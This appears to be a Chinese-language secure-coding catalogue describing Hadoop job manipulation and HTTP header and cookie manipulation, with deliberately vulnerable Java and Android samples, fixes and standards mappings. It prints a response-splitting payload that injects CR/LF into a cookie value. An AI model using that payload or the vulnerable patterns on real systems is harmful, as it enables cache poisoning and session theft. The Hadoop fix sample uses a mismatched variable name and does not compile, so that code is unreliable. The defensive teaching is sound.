<h4 id="Hadoop-Job-Manipulation"><a href="#Hadoop-Job-Manipulation" class="headerlink" title="Hadoop Job Manipulation"></a>Hadoop Job Manipulation</h4><h5 id="ABSTRACT-283"><a href="#ABSTRACT-283" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>向 Hadoop 群集中提交的 Job 在有害环境中可能被篡改。</p>
<h5 id="EXPLANATION-284"><a href="#EXPLANATION-284" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Hadoop job manipulation 错误在以下情况中出现：</p>
<ul>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>数据用来指定控制客户端作业的 JobConf 值。</p>
</li>
</ul>
<p>Hadoop 群集是一种有害环境。当用来防止对群集设备中 HDFS 未经授权访问的安全配置设置不当时，攻击可能会乘机进行控制。从而造成 Hadoop 群集提供的任何数据被篡改的可能性。</p>
<p>例 1：下列代码是典型客户端应用程序中提交的 Job，其输入来自 Hadoop 群集中主计算机的命令行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">public void run(String args[]) throws IOException &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  String inputDir = args[0];</span><br><span class="line"></span><br><span class="line">  String outputDir = args[1];</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  // Untrusted command line argument</span><br><span class="line"></span><br><span class="line">  int numOfReducers = Integer.parseInt(args[3]);</span><br><span class="line"></span><br><span class="line">  Class mapper = getClassByName(args[4]);</span><br><span class="line"></span><br><span class="line">  Class reducer = getClassByName(args[5]);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  Configuration defaults = new Configuration();</span><br><span class="line"></span><br><span class="line">  JobConf job = new JobConf(defaults, OptimizedDataJoinJob.class);</span><br><span class="line"></span><br><span class="line">  job.setNumMapTasks(1);</span><br><span class="line"></span><br><span class="line">  // An attacker may set random values that exceed the range of acceptable number of reducers</span><br><span class="line"></span><br><span class="line">  job.setNumReduceTasks(numOfReducers);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  return job;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例 2：以下代码显示了攻击者通过命令行参数控制运行作业中止的情形：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  JobID id = JobID.forName(args[0]);</span><br><span class="line"></span><br><span class="line">  JobConf conf = new JobConf(WordCount.class);</span><br><span class="line"></span><br><span class="line">  // configure this JobConf instance</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  JobClient.runJob(conf);</span><br><span class="line"></span><br><span class="line">  RunningJob job = JobClient.getJob(id);</span><br><span class="line"></span><br><span class="line">  job.killJob();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-283"><a href="#RECOMMENDATIONS-283" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>对来自不可信任的数据源的数据进行验证。在这种情况下，客户端应用程序运行所使用的 Hadoop 群集应被看作不可信任的数据源。因此，命令行参数、配置文件和存储在 HDFS 上的数据在被应用程序使用前，应根据一个包含已知可接受值的白名单进行验证。</p>
<p>例 3：重新回到例 1：我们可以对允许进行作业调用的 reducer 数量添加显式限制。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">public void run(String args[]) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    String inputDir = args[0];</span><br><span class="line"></span><br><span class="line">    String outputDir = args[1];</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    // Untrusted command line argument</span><br><span class="line"></span><br><span class="line">    int numOfReducers = Integer.parseInt(args[3]);</span><br><span class="line"></span><br><span class="line">    Class mapper = getClassByName(args[4]);</span><br><span class="line"></span><br><span class="line">    Class reducer = getClassByName(args[5]);</span><br><span class="line"></span><br><span class="line">    Configuration defaults = new Configuration();</span><br><span class="line"></span><br><span class="line">    JobConf job = new JobConf(defaults, OptimizedDataJoinJob.class);</span><br><span class="line"></span><br><span class="line">    job.setNumMapTasks(1);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    if(numberOfReducers &gt; 0 &amp;&amp; numberOfReducers &lt; 200)&#123;</span><br><span class="line"></span><br><span class="line">        job.setNumReduceTasks(numOfReducers);</span><br><span class="line"></span><br><span class="line">    &#125;else &#123;</span><br><span class="line"></span><br><span class="line">        job.setNumReduceTasks(1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    return job;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-282"><a href="#REFERENCES-282" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[3] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[10] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Header-Manipulation"><a href="#Header-Manipulation" class="headerlink" title="Header Manipulation"></a>Header Manipulation</h4><h5 id="ABSTRACT-284"><a href="#ABSTRACT-284" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>HTTP 响应头文件中包含未验证的数据会引发 cache-poisoning、cross-site scripting、cross-user defacement、page hijacking、cookie manipulation 或 open redirect。</p>
<h5 id="EXPLANATION-285"><a href="#EXPLANATION-285" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>以下情况中会出现 Header Manipulation 漏洞：</p>
<ol>
<li><p>数据通过一个不可信赖的数据源进入 Web 应用程序，最常见的是 HTTP 请求。</p>
</li>
<li><p>数据包含在一个 HTTP 响应头文件里，未经验证就发送给了 Web 用户。</p>
</li>
</ol>
<p>如同许多软件安全漏洞一样，Header Manipulation 只是通向终端的一个途径，它本身并不是终端。从本质上看，这些漏洞是显而易见的：一个攻击者将恶意数据传送到易受攻击的应用程序，且该应用程序将数据包含在 HTTP 响应头文件中。</p>
<p>其中最常见的一种 Header Manipulation 攻击是 HTTP Response Splitting。为了成功地实施 HTTP Response Splitting 盗取，应用程序必须允许将那些包含 CR（回车，由 %0d 或 \r 指定）和 LF（换行，由 %0a 或 \n 指定）的字符输入到头文件中。攻击者利用这些字符不仅可以控制应用程序要发送的响应剩余头文件和正文，还可以创建完全受其控制的其他响应。</p>
<p>如今的许多现代应用程序服务器可以防止 HTTP 头文件感染恶意字符。例如，如果尝试使用被禁用的字符设置头文件，最新版本的 Apache Tomcat 会抛出 IllegalArgumentException。如果您的应用程序服务器能够防止设置带有换行符的头文件，则其具备对 HTTP Response Splitting 的防御能力。然而，单纯地过滤换行符可能无法保证应用程序不受 Cookie Manipulation 或 Open Redirects 的攻击，因此必须在设置带有用户输入的 HTTP 头文件时采取措施。</p>
<p>示例：下列代码片段会从 HTTP 请求中读取网络日志项的作者名字 author，并将其置于一个 HTTP 响应的 cookie 头文件中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String author = request.getParameter(AUTHOR_PARAM);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Cookie cookie = new Cookie(&quot;author&quot;, author);</span><br><span class="line"></span><br><span class="line">     cookie.setMaxAge(cookieExpiration);</span><br><span class="line"></span><br><span class="line">     response.addCookie(cookie);</span><br></pre></td></tr></table></figure>
<p>假设在请求中提交了一个字符串，该字符串由标准的字母数字字符组成，如“Jane Smith”，那么包含该 cookie 的 HTTP 响应可能表现为以下形式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Set-Cookie: author=Jane Smith</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>然而，因为 cookie 值来源于未经校验的用户输入，所以仅当提交给 AUTHOR_PARAM 的值不包含任何 CR 和 LF 字符时，响应才会保留这种形式。如果攻击者提交的是一个恶意字符串，比如“Wiley Hacker\r\nHTTP/1.1 200 OK\r\n…”，那么 HTTP 响应就会被分割成以下形式的两个响应：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Set-Cookie: author=Wiley Hacker</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>显然，第二个响应已完全由攻击者控制，攻击者可以用所需的头文件和正文内容构建该响应。攻击者可以构建任意 HTTP 响应，从而发起多种形式的攻击，包括：cross-user defacement、网络和浏览器缓存中毒、cross-site scripting 和 page hijacking。</p>
<p>Cross-User Defacement：攻击者可以向一个易受攻击的服务器发出一个请求，导致服务器创建两个响应，其中第二个响应可能会被曲解为对其他请求的响应，而这一请求很可能是与服务器共享相同 TCP 连接的另一用户发出的。这种攻击可以通过以下方式实现：攻击者诱骗用户，让他们自己提交恶意请求；或在远程情况下，攻击者与用户共享同一个连接到服务器（如共享代理服务器）的 TCP 连接。最理想的情况是，攻击者通过这种方式使用户相信自己的应用程序已经遭受了黑客攻击，进而对应用程序的安全性失去信心。最糟糕的情况是，攻击者可能提供经特殊技术处理的内容，这些内容旨在模仿应用程序的执行方式，但会重定向用户的私人信息（如帐号和密码），将这些信息发送给攻击者。</p>
<p>缓存中毒： 如果多用户 Web 缓存或者单用户浏览器缓存将恶意构建的响应缓存起来，该响应的破坏力会更大。如果响应缓存在共享的 Web 缓存（如在代理服务器中常见的缓存）中，那么使用该缓存的所有用户都会不断收到恶意内容，直到清除该缓存项为止。同样，如果响应缓存在单个用户的浏览器中，那么在清除该缓存项以前，该用户会不断收到恶意内容。然而，影响仅局限于本地浏览器的用户。</p>
<p>Cross-Site Scripting：一旦攻击者控制了应用程序传送的响应，就可以选择多种恶意内容来传播给用户。Cross-Site Scripting 是最常见的攻击形式，这种攻击在响应中包含了恶意的 JavaScript 或其他代码，并在用户的浏览器中执行。基于 XSS 的攻击手段花样百出，几乎是无穷无尽的，但通常它们都会包含传输给攻击者的私人数据（如 Cookie 或者其他会话信息）。在攻击者的控制下，指引受害者进入恶意的网络内容；或者利用易受攻击的站点，对用户的机器进行其他恶意操作。对于易受攻击的应用程序用户，最常见且最危险的攻击就是使用 JavaScript 将会话和 authentication 信息返回给攻击者，而后攻击者就可以完全控制受害者的帐号了。</p>
<p>Page Hijacking：除了利用一个易受攻击的应用程序向用户传输恶意内容，还可以利用相同的根漏洞，将服务器生成的供用户使用的敏感内容重定向，转而供攻击者使用。攻击者通过提交一个会导致两个响应的请求，即服务器做出的预期响应和攻击者创建的响应，致使某个中间节点（如共享的代理服务器）误导服务器所生成的响应，将本来应传送给用户的响应错误地传给攻击者。因为攻击者创建的请求产生了两个响应，第一个被解析为针对攻击者请求做出的响应，第二个则被忽略。当用户通过同一 TCP 连接发出合法请求时，攻击者的请求已经在此处等候，并被解析为针对受害者这一请求的响应。这时，攻击者将第二个请求发送给服务器，代理服务器利用针对受害者（用户）的、由该服务器产生的这一请求对服务器做出响应，因此，针对受害者的这一响应中会包含所有头文件或正文中的敏感信息。</p>
<p>Cookie Manipulation：当与类似跨站请求伪造的攻击相结合时，攻击者就可以篡改、添加、甚至覆盖合法用户的 cookie。</p>
<p>Open Redirect：如果允许未验证的输入来控制重定向机制所使用的 URL，可能会有利于攻击者发动钓鱼攻击。</p>
<h5 id="RECOMMENDATIONS-284"><a href="#RECOMMENDATIONS-284" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>针对 Header Manipulation 的解决方法是，确保在适当位置进行输入验证并检验其属性是否正确。</p>
<p>由于 Header Manipulation 漏洞出现在应用程序的输出中包含恶意数据时，因此，合乎逻辑的做法是在应用程序输出数据前一刻对其进行验证。然而，由于 Web 应用程序常常会包含复杂而难以理解的代码，用以生成动态响应，因此，这一方法容易产生遗漏错误（遗漏验证）。降低这一风险的有效途径是对 Header Manipulation 也执行输入验证。</p>
<p>由于 Web 应用程序必须验证输入信息以避免出现其他漏洞（如 SQL Injection），因此，一种相对简单的解决方法是扩充应用程序现有的输入验证机制，增加针对 Header Manipulation 的检查。尽管具有一定的价值，但 Header Manipulation 输入验证并不能取代严格的输出验证。应用程序可能通过共享的数据存储或其他可信赖的数据源接受输入，而该数据存储所接受的输入源可能并未执行适当的输入验证。因此，应用程序不能间接地依赖于该数据或其他任意数据的安全性。这就意味着，避免 Header Manipulation 漏洞的最佳方法是验证所有应用程序输入数据或向用户输出的数据。</p>
<p>针对 Header Manipulation 漏洞进行验证最安全的方式是创建一份安全字符白名单，其中的字符允许出现在 HTTP 响应头文件中，并且只接受完全由这些受认可的字符组成的输入。例如，有效的用户名可能仅包含字母数字字符，帐号可能仅包含 0-9 的数字。</p>
<p>更灵活的解决方法称为黑名单方法，但其安全性较差，这种方法在进行输入之前就有选择地拒绝或避免了潜在的危险字符。为了创建这样的列表，首先需要了解在 HTTP 响应头文件中具有特殊含义的一组字符。尽管 CR 和 LF 字符是 HTTP Response Splitting 攻击的核心，但其他字符，如“:”（冒号）和“=”（等号），在响应头文件中同样具有特殊的含义。</p>
<p>一旦在应用程序中确定了针对 Header Manipulation 攻击执行验证的正确点，以及验证过程中要考虑的特殊字符，下一个难题就是确定在验证过程中该如何处理各种特殊字符。应用程序应拒绝任何要添加到 HTTP 响应头文件中的包含特殊字符的输入，这些特殊字符（特别是 CR 和 LF）是无效字符。</p>
<p>许多应用程序服务器都试图避免应用程序出现 HTTP Response Splitting 漏洞，其做法是为负责设置 HTTP 头文件和 cookie 的函数提供各种执行方式，以检验是否存在进行 HTTP Response Splitting 攻击必需的字符。不要依赖运行应用程序的服务器，以此确保该应用程序的安全。开发了某个应用程序后，并不能保证在其生命周期中它会在哪些应用程序服务器中运行。由于标准和已知盗取方式的演变，我们不能保证应用程序服务器也会保持同步。</p>
<h5 id="REFERENCES-283"><a href="#REFERENCES-283" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] A. Klein Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics</p>
<p>[2] D. Crab HTTP Response Splitting</p>
<p>[3] INPUT-1: Validate inputs Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 113</p>
<p>[5] Standards Mapping - FIPS200 SI</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs</p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Web Application Security Consortium 24 + 2 HTTP Response Splitting</p>
<p>[29] Standards Mapping - Web Application Security Consortium Version 2.00 HTTP Response Splitting (WASC-25)</p>
<h4 id="Header-Manipulation-Cookies"><a href="#Header-Manipulation-Cookies" class="headerlink" title="Header Manipulation: Cookies"></a>Header Manipulation: Cookies</h4><h5 id="ABSTRACT-285"><a href="#ABSTRACT-285" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在 Cookies 中包含未验证的数据会引发 HTTP 响应头文件操作攻击，并可能导致 cache-poisoning、cross-site scripting、cross-user defacement、page hijacking、cookie manipulation 或 open redirect。</p>
<h5 id="EXPLANATION-286"><a href="#EXPLANATION-286" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>以下情况中会出现 Cookie Manipulation 漏洞：</p>
<ol>
<li><p>数据通过一个不可信赖的数据源进入 Web 应用程序，最常见的是 HTTP 请求。</p>
</li>
<li><p>数据包含在一个 HTTP Cookie 中，该 Cookie 未经验证就发送给了 Web 用户。</p>
</li>
</ol>
<p>如同许多软件安全漏洞一样，Cookie Manipulation 只是通向终端的一个途径，它本身并不是终端。从本质上看，这些漏洞是显而易见的：攻击者可将恶意数据传送到易受攻击的应用程序，且该应用程序将这些数据包含在 HTTP Cookie 中。</p>
<p>Cookie Manipulation：当与类似跨站请求伪造的攻击相结合时，攻击者就可以篡改、添加、甚至覆盖合法用户的 cookie。</p>
<p>作为 HTTP 响应头文件，Cookie Manipulation 攻击也可导致其他类型的攻击，例如：</p>
<p>HTTP Response Splitting： 其中最常见的一种 Header Manipulation 攻击是 HTTP Response Splitting。为了成功地实施 HTTP Response Splitting 盗取，应用程序必须允许将那些包含 CR（回车，由 %0d 或 \r 指定）和 LF（换行，由 %0a 或 \n 指定）的字符输入到头文件中。攻击者利用这些字符不仅可以控制应用程序要发送的响应剩余头文件和正文，还可以创建完全受其控制的其他响应。</p>
<p>如今的许多现代应用程序服务器可以防止 HTTP 头文件感染恶意字符。例如，如果尝试使用被禁用的字符设置头文件，最新版本的 Apache Tomcat 会抛出 IllegalArgumentException。如果您的应用程序服务器能够防止设置带有换行符的头文件，则其具备对 HTTP Response Splitting 的防御能力。然而，单纯地过滤换行符可能无法保证应用程序不受 Cookie Manipulation 或 Open Redirects 的攻击，因此必须在设置带有用户输入的 HTTP 头文件时采取措施。</p>
<p>例 1：下列代码片段会从 HTTP 请求中读取网络日志项的作者名字 author，并将其置于一个 HTTP 响应的 cookie 头文件中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String author = request.getParameter(AUTHOR_PARAM);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Cookie cookie = new Cookie(&quot;author&quot;, author);</span><br><span class="line"></span><br><span class="line">     cookie.setMaxAge(cookieExpiration);</span><br><span class="line"></span><br><span class="line">     response.addCookie(cookie);</span><br></pre></td></tr></table></figure>
<p>假设在请求中提交了一个字符串，该字符串由标准的字母数字字符组成，如“Jane Smith”，那么包含该 cookie 的 HTTP 响应可能表现为以下形式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Set-Cookie: author=Jane Smith</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>然而，因为 cookie 值来源于未经校验的用户输入，所以仅当提交给 AUTHOR_PARAM 的值不包含任何 CR 和 LF 字符时，响应才会保留这种形式。如果攻击者提交的是一个恶意字符串，比如“Wiley Hacker\r\nHTTP/1.1 200 OK\r\n…”，那么 HTTP 响应就会被分割成以下形式的两个响应：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Set-Cookie: author=Wiley Hacker</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>显然，第二个响应已完全由攻击者控制，攻击者可以用所需的头文件和正文内容构建该响应。攻击者可以构建任意 HTTP 响应，从而发起多种形式的攻击，包括：cross-user defacement、网络和浏览器缓存中毒、cross-site scripting 和 page hijacking。</p>
<p>有些人认为在移动世界中，典型的 Web 应用程序漏洞（如头文件和 Cookie Manipulation）是无意义的 – 为什么用户要攻击自己？但是，谨记移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。恶意软件在银行应用程序附近运行的可能性很高，它们会强制扩展移动应用程序的攻击面（包括跨进程通信）。</p>
<p>例 2：以下代码将例 1 改编为适用于 Android 平台。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">	CookieManager webCookieManager = CookieManager.getInstance();</span><br><span class="line"></span><br><span class="line">        String author = this.getIntent().getExtras().getString(AUTHOR_PARAM);</span><br><span class="line"></span><br><span class="line">	String setCookie = &quot;author=&quot; + author + &quot;; max-age=&quot; + cookieExpiration;</span><br><span class="line"></span><br><span class="line">        webCookieManager.setCookie(url, setCookie);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Cross-User Defacement：攻击者可以向一个易受攻击的服务器发出一个请求，导致服务器创建两个响应，其中第二个响应可能会被曲解为对其他请求的响应，而这一请求很可能是与服务器共享相同 TCP 连接的另一用户发出的。这种攻击可以通过以下方式实现：攻击者诱骗用户，让他们自己提交恶意请求；或在远程情况下，攻击者与用户共享同一个连接到服务器（如共享代理服务器）的 TCP 连接。最理想的情况是，攻击者通过这种方式使用户相信自己的应用程序已经遭受了黑客攻击，进而对应用程序的安全性失去信心。最糟糕的情况是，攻击者可能提供经特殊技术处理的内容，这些内容旨在模仿应用程序的执行方式，但会重定向用户的私人信息（如帐号和密码），将这些信息发送给攻击者。</p>
<p>缓存中毒： 如果多用户 Web 缓存或者单用户浏览器缓存将恶意构建的响应缓存起来，该响应的破坏力会更大。如果响应缓存在共享的 Web 缓存（如在代理服务器中常见的缓存）中，那么使用该缓存的所有用户都会不断收到恶意内容，直到清除该缓存项为止。同样，如果响应缓存在单个用户的浏览器中，那么在清除该缓存项以前，该用户会不断收到恶意内容。然而，影响仅局限于本地浏览器的用户。</p>
<p>Cross-Site Scripting:一旦攻击者控制了应用程序传送的响应，就可以选择多种恶意内容来传播给用户。Cross-Site Scripting 是最常见的攻击形式，这种攻击在响应中包含了恶意的 JavaScript 或其他代码，并在用户的浏览器中执行。基于 XSS 的攻击手段花样百出，几乎是无穷无尽的，但通常它们都会包含传输给攻击者的私人数据（如 Cookie 或者其他会话信息）。在攻击者的控制下，指引受害者进入恶意的网络内容；或者利用易受攻击的站点，对用户的机器进行其他恶意操作。对于易受攻击的应用程序用户，最常见且最危险的攻击就是使用 JavaScript 将会话和 authentication 信息返回给攻击者，而后攻击者就可以完全控制受害者的帐号了。</p>
<p>Page Hijacking：除了利用一个易受攻击的应用程序向用户传输恶意内容，还可以利用相同的根漏洞，将服务器生成的供用户使用的敏感内容重定向，转而供攻击者使用。攻击者通过提交一个会导致两个响应的请求，即服务器做出的预期响应和攻击者创建的响应，致使某个中间节点（如共享的代理服务器）误导服务器所生成的响应，将本来应传送给用户的响应错误地传给攻击者。因为攻击者创建的请求产生了两个响应，第一个被解析为针对攻击者请求做出的响应，第二个则被忽略。当用户通过同一 TCP 连接发出合法请求时，攻击者的请求已经在此处等候，并被解析为针对受害者这一请求的响应。这时，攻击者将第二个请求发送给服务器，代理服务器利用针对受害者（用户）的、由该服务器产生的这一请求对服务器做出响应，因此，针对受害者的这一响应中会包含所有头文件或正文中的敏感信息。</p>
<p>打开重定向：如果允许未验证的输入来控制重定向机制所使用的 URL，可能会有利于攻击者发动钓鱼攻击。</p>
<h5 id="RECOMMENDATIONS-285"><a href="#RECOMMENDATIONS-285" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>针对 Cookie Manipulation 的解决方法是，确保在适当位置进行输入验证并检验其属性是否正确。</p>
<p>由于 Header Manipulation 漏洞（类似于 Cookie Manipulation）出现在应用程序的输出中包含恶意数据时，因此，合乎逻辑的做法是在应用程序输出数据前一刻对其进行验证。然而，由于 Web 应用程序常常会包含复杂而难以理解的代码，用以生成动态响应，因此，这一方法容易产生遗漏错误（遗漏验证）。降低这一风险的有效途径是对 Header Manipulation 也执行输入验证。</p>
